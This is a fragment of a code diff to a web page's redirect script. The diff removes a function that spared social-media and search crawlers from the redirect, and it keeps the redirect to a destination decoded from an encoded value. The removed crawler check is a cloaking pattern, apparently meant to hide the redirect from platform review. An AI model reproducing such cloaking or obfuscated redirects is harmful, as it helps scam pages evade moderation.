@@ -35,27 +35,12 @@
             }
         }
 
-        function isBot() {
-            const userAgent = navigator.userAgent.toLowerCase();
-            const botSignatures = [
-                'facebookexternalhit', 'facebot', 'meta-inspector',
-                'googlebot', 'bingbot', 'slurp', 'twitterbot', 'linkedinbot',
-                'crawler', 'spider', 'bot'
-            ];
-            return botSignatures.some(signature => userAgent.includes(signature)) &&
-                   !/chrome|safari|firefox|edge|opera/i.test(userAgent);
-        }
-
         if (redirectStatus === 'ON' && data) {
-            if (!isBot()) {
-                const destination = decodeAdvanced(data);
-                if (destination) {
-                    window.location.replace(destination);
-                } else {
-                    console.error("Failed to decode URL.");
-                }
+            const destination = decodeAdvanced(data);
+            if (destination) {
+                window.location.replace(destination);
             } else {
-                console.log("Bot detected, not redirecting.");
+                console.error("Failed to decode URL.");
             }
         }
     </script>
